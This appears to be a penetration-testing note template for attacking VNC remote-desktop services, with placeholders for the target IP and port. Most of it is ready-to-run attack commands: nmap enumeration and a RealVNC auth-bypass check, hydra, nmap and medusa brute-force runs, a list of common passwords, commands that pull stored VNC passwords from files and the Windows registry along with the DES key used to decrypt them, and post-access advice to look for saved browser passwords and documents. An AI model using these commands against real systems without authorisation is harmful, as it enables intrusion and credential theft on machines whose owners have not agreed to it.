# VNC — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 5900 -%>

> [!info] VNC (Virtual Network Computing) provides remote desktop access. Port 5900=display :0, 5901=display :1, etc. 5800=Java web client. Authentication is often just a password (no username).

---

## Nmap
```bash
nmap -p<% port %> --script=vnc-info,vnc-brute,realvnc-auth-bypass <% ip %>
```

```bash
nmap -p<% port %> --script=vnc-info <% ip %>
```

---

## Authentication Check
```bash
nmap -p<% port %> --script=vnc-info --script-args vnc.password=<password> <% ip %>
```

> [!tip] Check nmap output for auth type:
> - `None` — no auth required, connect directly!
> - `VNC Authentication` — password only (max 8 chars)
> - `SecurityType: 18` — NLA / enterprise auth
> - `RealVNC` — may be vulnerable to auth bypass (check CVE-2006-2369)

---

## No Auth — Direct Connect
```bash
# If auth type = None
vncviewer <% ip %>:<% port %>
```

```bash
xtightvncviewer <% ip %>:<% port %>
```

---

## Authenticated Connect
```bash
vncviewer <% ip %>:<% port %>
# Enter password when prompted
```

```bash
# Non-interactive with password
echo '<password>' | vncviewer -passwd /dev/stdin <% ip %>:<% port %>
```

```bash
# Remmina GUI
remmina -c vnc://<% ip %>:<% port %>
```

---

## Brute Force
```bash
hydra -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt vnc://<% ip %> -s <% port %> -t 1 -V
```

```bash
nmap -p<% port %> --script=vnc-brute --script-args passdb=/usr/share/wordlists/rockyou.txt <% ip %>
```

```bash
# Medusa (slower but thorough)
medusa -h <% ip %> -P /usr/share/wordlists/rockyou.txt -M vnc -n <% port %> -t 1
```

> [!warning] Many VNC implementations lock out after N failed attempts. Try common passwords first.

---

## Common VNC Passwords
```
password
123456
admin
vnc
changeme
(blank — just press Enter)
```

---

## RealVNC Auth Bypass (CVE-2006-2369)
```bash
# Versions: RealVNC 4.1.0 and earlier
nmap -p<% port %> --script=realvnc-auth-bypass <% ip %>
```

---

## Extract Stored VNC Passwords

### Linux (TigerVNC / TightVNC)
```bash
cat ~/.vnc/passwd
# Decrypt with: vncpwd <hash>
# Or: python3 -c "from pyDes import des; ..."
```

```bash
# vncpwd tool
vncpwd $(xxd -p ~/.vnc/passwd | tr -d ' \n')
```

### Windows (RealVNC / TightVNC)
```powershell
# Registry
reg query HKCU\Software\TightVNC\Server /v Password
reg query HKCU\Software\RealVNC\vncserver /v Password
reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password

# From captured hash
# TightVNC password is DES encrypted with key 0xe84ad660c4721ae0
```

---

## Screenshot Without Auth (if display 0 accessible)
```bash
# x11vnc screenshot approach (from target if you have shell)
# Install xwd on target
DISPLAY=:0 xwd -root -silent | convert - screenshot.png
```

---

## Post-Connection — What to Do
```bash
# VNC gives full GUI access — same as sitting at keyboard
# Key things to check:
# 1. Running applications (browser tabs, email, internal tools)
# 2. Saved passwords in browser
# 3. Documents on desktop / open files
# 4. Terminal history
# 5. Try to escalate from current user session
```

---

## Notes
